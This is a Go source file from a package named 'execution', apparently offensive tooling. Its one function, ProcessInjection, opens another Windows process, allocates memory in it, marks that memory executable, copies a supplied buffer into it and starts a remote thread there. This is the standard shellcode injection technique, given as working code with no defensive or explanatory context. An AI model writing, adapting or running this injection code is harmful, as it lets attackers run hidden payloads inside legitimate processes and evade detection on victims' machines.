package execution

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT           = 0x1000
	MEM_RESERVE          = 0x2000
	PROCESS_VM_WRITE     = 0x0020
	PROCESS_VM_OPERATION = 0x0008
)

func ProcessInjection(procId uintptr, buf *byte, size uintptr) {

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess := kernel32.NewProc("OpenProcess")
	procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")

	hProcess, _, _ := procOpenProcess.Call(PROCESS_VM_WRITE|PROCESS_VM_OPERATION,
		0,
		procId,
	)
	defer syscall.CloseHandle(syscall.Handle(hProcess))
	fmt.Println(hProcess)

	addr, _, err := procVirtualAllocEx.Call(
		hProcess,
		0,
		size,
		MEM_COMMIT|MEM_RESERVE,
		syscall.PAGE_READONLY,
	)
	if err != nil {
		fmt.Println("Error:", err, addr)
	}
	oldProtect := uint32(0)

	ret, _, err1 := procVirtualProtectEx.Call(
		hProcess,
		addr,
		size,
		uintptr(syscall.PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if err1 != nil {
		fmt.Println("Error:", err, ret)
	}

	var bytesWritten uintptr
	fmt.Println("buffer size:", size)

	ret2, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess), // handle to procId
		addr,
		uintptr(unsafe.Pointer(buf)), // source buffer
		size,                         // size
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if err != nil {
		fmt.Println("Error WriteProcessMemory:", err, ret2)
	}

	param := uintptr(0)
	threadId := uintptr(0)

	handle, _, _ := procCreateRemoteThread.Call(
		hProcess,
		0,
		0,
		addr,
		param,
		0,
		uintptr(unsafe.Pointer(&threadId)),
	)
	defer syscall.CloseHandle(syscall.Handle(handle))
	fmt.Println(handle)
}
